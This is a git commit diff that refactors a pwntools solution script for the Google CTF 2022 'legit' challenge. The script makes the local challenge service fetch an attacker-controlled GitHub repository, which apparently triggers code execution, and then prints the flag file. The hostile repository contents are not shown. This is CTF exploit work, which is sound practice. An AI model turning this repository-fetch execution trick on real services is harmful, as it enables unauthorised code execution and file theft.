3e0d9659edf09d6197d4695b0833d5a537a92f6c
Gal Tashma <galtashma@gmail.com>
2022-07-16 14:50:52 +0300

    refactor for readability

--- google-ctf-2022/legit/sol.py
+++ google-ctf-2022/legit/sol.py
@@ -1,29 +1,50 @@
 from pwn import *
+import time
 
-REPO = b'https://github.com/bitterbit/googlectf-2022-legit.git'
-PATH_TO_FLAG_ARTIFACT = b'my-bear-repo/worktree/flag'
-
-conn = remote('localhost', 1337)
-conn.recvuntil(b'>>> Repo url:')
-conn.sendline(REPO)
-
-conn.recvuntil(b'>>>')
-conn.sendline(b'1') # List files in repository
-conn.recvuntil(b'Subdirectory to enter:')
-conn.sendline(b'my-bear-repo')
-conn.recvuntil(b'Subdirectory to enter:')
-conn.sendline(b'')
+REPO = 'https://github.com/bitterbit/googlectf-2022-legit.git'
+PATH_TO_FLAG_ARTIFACT = 'my-bear-repo/worktree/flag'
 
 
-conn.recvuntil(b'>>>')
-conn.sendline(b'3') # Check for updates (fetch)
+def enter_directories(conn, paths):
+    select_option(conn, 1)
+    for path in paths:
+        conn.recvuntil(b'Subdirectory to enter:')
+        conn.sendline(str.encode(path))
+    conn.sendline(b'')
 
-conn.recvuntil(b'>>>')
-conn.sendline(b'2')
-conn.recvuntil(b'Path of the file to display:')
-conn.sendline(PATH_TO_FLAG_ARTIFACT)
 
-print('flag:', flat(conn.recvline()).strip())
+def trigger_exec(conn):
+    select_option(conn, 3) # Check for updates (fetch)
+    conn.recvuntil(b'Nothing new..')
 
-conn.recvuntil(b'>>>')
-conn.sendline(b'5') # Exit
+
+def get_file(conn, path):
+    select_option(conn, 2) # Print file
+    conn.recvuntil(b'Path of the file to display:')
+    conn.sendline(str.encode(path))
+    return conn.recvline()
+
+
+def select_exit(conn):
+    select_option(conn, 5)
+
+
+def select_option(conn, option_number: int):
+    conn.recvuntil(b'>>>')
+    option_string = str(option_number)
+    conn.sendline(str.encode(option_string)) # List files in repository
+
+
+if __name__ == '__main__':
+    with context.local(log_level='info'):
+        conn = remote('localhost', 1337)
+        conn.recvuntil(b'>>> Repo url:')
+        conn.sendline(str.encode(REPO))
+
+        enter_directories(conn, ['my-bear-repo'])
+        trigger_exec(conn)
+        flag = get_file(conn, PATH_TO_FLAG_ARTIFACT)
+        print('flag:', flat(flag).strip())
+
+        select_exit(conn)
+
